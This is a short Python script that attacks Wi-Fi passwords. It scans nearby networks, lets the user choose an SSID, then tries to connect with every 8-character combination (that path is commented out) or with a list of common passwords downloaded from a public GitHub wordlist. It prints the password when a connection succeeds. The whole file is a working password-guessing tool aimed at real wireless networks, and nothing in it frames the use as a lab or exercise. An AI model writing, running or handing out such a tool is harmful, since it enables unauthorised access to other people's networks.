from wifi import *
from wireless import *
from urllib2 import *
from time import *

password_char="abcdefghijklmnopqrstuvwxyz"
password_char+="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
password_char+="1234567890"
password_char+="!@#$%^&*()-_=+{}[];:,.<>/?"

def wifi_scan(interface):
	cells = Cell.all(interface)
	for i in range(len(cells)):
		print("%d . %s"%(i+1, cells[i].ssid))
	
	num = raw_input("which ssid >> ")

	return cells[int(num)-1].ssid

def brute_force(interface, ssid):
	wireless = Wireless(interface)
#assume that length of password is 8
	for a in password_char:
		for b in password_char:
			for c in password_char:
				for d in password_char:
					for e in password_char:
						for f in password_char:
							for g in password_char:
								for h in password_char:
									password = a + b + c + d + e + f + g + h
									print("%s connection"%password)
									if wireless.connect(ssid=ssid, password=password) == True:
										print("I found password")
										return password
									else:
										print("not found")


def list_attack(interface, ssid):
	url = "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top1575-probable-v2.txt"
	response = urlopen( url )
	txt = response.read()
	passwords = txt.splitlines()

	wireless = Wireless(interface)
	for text in passwords:
		print("%s connection"%text)
		if len(text) < 8:
			print("length too short")
			continue
		if wireless.connect(ssid=ssid, password=text) == True:
			print("I found password")
			return text
		else:
			print("not found")

if __name__ == "__main__":
	interface = raw_input("which interface >> ")
	interface = "wlx1cbfcea325e6"
	cell = wifi_scan(interface)
	start = time()
#pw=brute_force(interface, cell)
	pw=list_attack(interface, cell)
	end = time()
	print("password : %s\n"%pw)
	print("time : %d"%(end-start))

